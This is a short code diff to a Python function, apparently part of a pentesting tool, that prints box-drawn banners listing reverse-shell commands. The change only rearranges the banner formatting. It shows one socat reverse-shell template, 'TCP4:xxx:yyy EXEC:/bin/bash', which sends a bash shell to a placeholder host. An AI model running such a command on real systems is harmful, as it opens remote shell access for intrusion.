@@ -203,13 +203,14 @@ def shell(listener: str):
         )
     if rlwrap:
         shells.append(windows_color)
-    shells.append(
-        r"""
-╔Socat══════════════════════════════════════════════"""
-    )
+        shells.append(
+            r"""
+╔Socat═════════╦════════════════════════════════════"""
+        )
     if not rlwrap:
         shells.append(
             r"""
+╔Socat══════════════════════════════════════════════
 ║ socat -d -d -d TCP4:xxx:yyy EXEC:/bin/bash"""
         )
         if pwncat:
@@ -223,7 +224,7 @@ def shell(listener: str):
         if not rlwrap:
             shells.append(
                 """
-╠═══════════════════════════════════════════════════"""
+╠══════════════╦════════════════════════════════════"""
             )
         shells.append(
             r"""
